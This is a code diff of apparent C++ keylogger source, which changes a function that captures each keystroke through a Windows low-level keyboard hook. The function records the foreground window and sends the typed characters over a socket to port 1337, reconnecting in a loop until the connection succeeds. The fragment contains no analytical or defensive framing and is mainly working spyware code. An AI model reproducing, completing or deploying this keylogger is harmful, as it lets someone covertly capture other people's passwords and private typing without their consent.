@@ -1,18 +1,15 @@
 #include "keyLogger.hpp"
 
-bool transform(const int& key)
+int transform(const int& key)
 {
-    if (!state)
-    {
-        while (spy.connect(sf::IpAddress::LocalHost, 1337) != sf::Socket::Status::Done)
+    while (spy.connect(sf::IpAddress::LocalHost, 1337) != sf::Socket::Status::Done)
             std::this_thread::sleep_for(std::chrono::milliseconds(250));
-    }
 
     sf::Packet data;
 
     std::string unpackedData;
 
-    if (key == 2)
+    if (key == VK_RBUTTON)
         return 0;
 
     auto foreGroundApplication = GetForegroundWindow();
@@ -39,8 +36,8 @@ bool transform(const int& key)
         data << " "; break;
     case(VK_TAB):
         data << "\t"; break;
-    case(1):
-        data << "\n"; break;
+    case(VK_LBUTTON):
+        data << " "; break;
     default:
         bool lower = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
@@ -65,11 +62,10 @@ bool transform(const int& key)
     }
 
     data << unpackedData;
-    if (spy.send(data) == sf::Socket::Status::Disconnected)
-        return false;
+    
+    spy.send(data);
 
-    return true;
-
+    return 0;
 }
 
 LRESULT keyBoardCallBack(int code, WPARAM wParam, LPARAM lParam)
@@ -79,7 +75,7 @@ LRESULT keyBoardCallBack(int code, WPARAM wParam, LPARAM lParam)
         if (wParam == WM_KEYDOWN)
         {
             kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
-            state = transform(kbStruct.vkCode);
+            transform(kbStruct.vkCode);
         }
     }
 
